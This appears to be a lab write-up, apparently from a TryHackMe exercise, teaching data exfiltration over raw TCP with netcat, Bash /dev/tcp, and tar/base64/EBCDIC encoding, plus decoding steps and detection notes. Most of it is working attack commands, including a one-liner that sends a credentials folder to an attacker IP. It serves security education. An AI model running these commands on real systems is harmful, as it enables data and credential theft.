
---

# 📡 **Data Exfiltration Over TCP Using Encoding**

> **💡 Summary**  
> Data exfiltration over TCP is a straightforward technique used in environments with weak monitoring. It sends data over a raw TCP socket, optionally encoded (Base64, EBCDIC) and archived (tar + gzip).  
> Although encoding hides content, this method is **easily detectable** in secured networks because it uses **non-standard outbound protocols**.

---

## 🧠 **1. How TCP Communication Works**

TCP communication requires:

1. One machine **listening** on a port
    
2. Another machine **connecting** to that port
    
3. Connection is established
    
4. **Data transmission** begins
    

> **ℹ️ Analogy:**  
> Like a conversation — one person listens, the other speaks.

Example (port 1337):

```bash
nc -lvp 1337            # listener
nc <IP> 1337            # connector
```

---

# 🧰 **2. Practice Environment**

- **Victim machine:** `victim1.thm.com`
    
- **Attacker machine (JumpBox):** `jump.thm.com`
    
- **Chosen port:** `8080`
    

---

## 🟢 **3. Start a Listener on JumpBox**

```bash
nc -lvp 8080 > /tmp/task4-creds.data
```

This:

- Listens on port **8080**
    
- Receives data
    
- Saves it to `/tmp/task4-creds.data`
    

> 📌 Leave this running during exfiltration.

---

## 🔐 **4. Access the Victim Machine**

From JumpBox:

```bash
ssh thm@victim1.thm.com
```

Or directly:

```bash
ssh thm@10.65.144.98 -p 2022
```

---

## 📄 **5. Check Data to Exfiltrate**

```bash
cat task4/creds.txt
```

Example:

```
admin:password
Admin:123456
root:toor
```

---

# 🚀 **6. Exfiltrate Data Over TCP**

### **Main exfiltration command (Victim → JumpBox):**

```bash
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

---

## 🧩 **Command Breakdown**

### 🔸 `tar zcf - task4/`

- `z` → gzip compress
    
- `c` → create archive
    
- `f -` → output to STDOUT  
    Compresses the folder **without creating a file on disk**.
    

### 🔸 `base64`

Encodes binary data → makes transmission safe.

### 🔸 `dd conv=ebcdic`

Converts ASCII to **EBCDIC** (non-readable encoding).

### 🔸 `/dev/tcp/<IP>/<port>`

A Bash feature that opens a **raw TCP socket**.

> ⚠️ **Reason for Encoding:**  
> To make traffic non-human-readable, preventing casual inspection.

---

# 📥 **7. JumpBox Receives the File**

Listener output example:

```
Connection from 192.168.0.101 received!
```

Check saved file:

```bash
ls -l /tmp/
```

You’ll find:

```
task4-creds.data
```

---

# 🔄 **8. Restore Data on JumpBox**

Convert data back from EBCDIC + decode Base64:

```bash
dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar
```

Breakdown:

- `dd conv=ascii` → convert EBCDIC → ASCII
    
- `base64 -d` → decode
    
- Output saved as `task4-creds.tar`
    

---

# 📂 **9. Extract the Archive**

```bash
tar xvf task4-creds.tar
```

Output:

```
task4/
task4/creds.txt
```

Confirm:

```bash
cat task4/creds.txt
```

---

# 🧭 **10. Quick Workflow Map**

```
[VICITM MACHINE]
     |
     | tar + gzip → base64 → dd (EBCDIC)
     V
   /dev/tcp/ATTACKER_IP:8080
     |
     V
[ATTACKER / JUMPBOX]
     |
     | dd (ASCII) → base64 -d → extract tar
     V
 Restored files
```

---

# 📌 **Key Takeaways**

> 🔐 **Encoding ≠ Encryption**  
> Base64 + EBCDIC only hides content, not activity.

> 🚨 **Easy to Detect**  
> RAW TCP traffic to unusual ports (8080 → non-HTTP) is suspicious.

> 🧰 **Useful Technique**  
> Works when standard exfiltration ports are blocked.

> ⚙️ **/dev/tcp Is Powerful**  
> Allows TCP connections without tools like `nc`.

---

